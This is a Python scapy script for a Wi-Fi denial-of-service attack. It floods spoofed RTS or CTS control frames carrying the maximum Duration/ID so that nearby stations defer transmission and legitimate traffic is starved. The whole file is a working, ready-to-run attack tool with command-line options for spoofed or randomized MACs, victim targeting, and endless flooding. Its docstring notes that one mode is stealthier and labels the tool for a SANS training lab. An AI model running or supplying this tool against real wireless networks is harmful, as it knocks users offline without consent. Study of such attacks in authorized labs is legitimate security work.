#!/usr/bin/env python3
"""
RTS/CTS NAV co-opting DoS.

Floods spoofed RTS or CTS control frames carrying a maximum Duration/ID
(0xFFFF microseconds). Every station that hears the frame updates its NAV
(Network Allocation Vector) and defers transmission for that duration.
Repeated injection holds the medium idle and starves legitimate traffic.

Modes
-----
rts  Send RTS from a fake client (-c/--client = TA) to the AP
     (-a/--ap = RA). The AP replies with a CTS that carries the same
     duration, propagating the NAV to every STA within range of the AP.
     If -c is a comma-separated list, the TA is randomized per frame --
     the AP sees RTS from many "clients" and emits a CTS to each.

cts  Send CTS directly to a victim STA (-c/--client = RA). Any neighbor
     that hears the CTS defers for the duration. No reply is generated,
     so this is more surgical (and stealthier) than RTS.
     If -c is a comma-separated list, the RA is randomized per frame --
     a broader NAV hold across multiple victims.

Run on a monitor-mode interface tuned to the target channel.

Authorized SANS SEC617 lab use only.
"""

import argparse
import random
import re
import time

from scapy.all import Dot11, RadioTap, sendp


DURATION_MAX = 0xFFFF  # Maximum Duration/ID value, in microseconds
MAC_RE = re.compile(r"^[0-9a-fA-F]{2}(:[0-9a-fA-F]{2}){5}$")


def build_rts(ap: str, client: str, duration: int) -> RadioTap:
    # type=1 (Control), subtype=11 (RTS). In scapy, the Dot11 `ID` field is
    # the 802.11 Duration/ID, not an element ID.
    return RadioTap() / Dot11(type=1, subtype=11,
                              addr1=ap, addr2=client, ID=duration)


def build_cts(victim: str, duration: int) -> RadioTap:
    # type=1 (Control), subtype=12 (CTS). CTS carries only addr1 (RA).
    return RadioTap() / Dot11(type=1, subtype=12,
                              addr1=victim, ID=duration)


def mac_list(value: str) -> list[str]:
    """Parse a comma-separated list of MAC addresses for argparse."""
    macs = []
    for m in value.split(","):
        m = m.strip().lower()
        if not m:
            continue
        if not MAC_RE.match(m):
            raise argparse.ArgumentTypeError(f"invalid MAC: {m!r}")
        macs.append(m)
    if not macs:
        raise argparse.ArgumentTypeError("no MACs provided")
    return macs


def flood(iface: str, packets: list, interval: float, count: int) -> int:
    """Send `packets` on `iface`. If multiple, pick one at random per frame.

    Returns the number of frames sent.
    """
    if len(packets) == 1:
        pkt = packets[0]
        if count > 0:
            sendp(pkt, iface=iface, inter=interval, count=count, verbose=False)
            return count
        sendp(pkt, iface=iface, inter=interval, loop=1, verbose=False)
        return 0  # only reached if sendp returns (it doesn't, until Ctrl-C)

    sent = 0
    while count == 0 or sent < count:
        sendp(random.choice(packets), iface=iface, verbose=False)
        sent += 1
        if interval > 0:
            time.sleep(interval)
    return sent


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("-m", "--mode", choices=("rts", "cts"), default="rts",
                   help="Frame type to flood (default: rts)")
    p.add_argument("-a", "--ap",
                   help="RTS mode: target AP MAC (RA). Ignored for CTS.")
    p.add_argument("-c", "--client", required=True, type=mac_list,
                   help="Comma-separated MAC(s). RTS mode: spoofed TA(s). "
                        "CTS mode: victim RA(s). Multiple MACs are randomized "
                        "per frame to broaden the NAV hold.")
    p.add_argument("-i", "--interface", required=True,
                   help="Monitor-mode interface tuned to the target channel")
    p.add_argument("-d", "--duration", type=lambda x: int(x, 0),
                   default=DURATION_MAX,
                   help=f"Duration/ID in microseconds (default {DURATION_MAX})")
    p.add_argument("--interval", type=float, default=0.03,
                   help="Inter-frame interval in seconds (default 0.03, ~33/sec)")
    p.add_argument("--count", type=int, default=0,
                   help="Number of frames to send (0 = run until Ctrl-C)")
    p.add_argument("-y", "--yes", action="store_true",
                   help="Skip the interactive 'press enter' prompt")
    args = p.parse_args()

    if args.mode == "rts" and not args.ap:
        p.error("--ap is required for rts mode")
    if not 0 <= args.duration <= 0xFFFF:
        p.error("--duration must fit in 16 bits (0..65535)")
    return args


def main() -> None:
    args = parse_args()

    if args.mode == "rts":
        packets = [build_rts(args.ap, c, args.duration) for c in args.client]
        role = "TA"
    else:
        packets = [build_cts(c, args.duration) for c in args.client]
        role = "RA"

    print(f"[*] Built {len(packets)} {args.mode.upper()} frame(s) "
          f"(duration={args.duration} us). Preview of first:")
    packets[0].show()
    if len(packets) > 1:
        rest = ", ".join(args.client[1:])
        print(f"\n[*] +{len(packets) - 1} more with randomized {role}: {rest}")

    if not args.yes:
        input(f"\nPress Enter to flood on {args.interface} (Ctrl-C to stop)...")

    try:
        sent = flood(args.interface, packets, args.interval, args.count)
        print(f"\n[*] Sent {sent} frames.")
    except KeyboardInterrupt:
        print("\nStopped.")


if __name__ == "__main__":
    main()
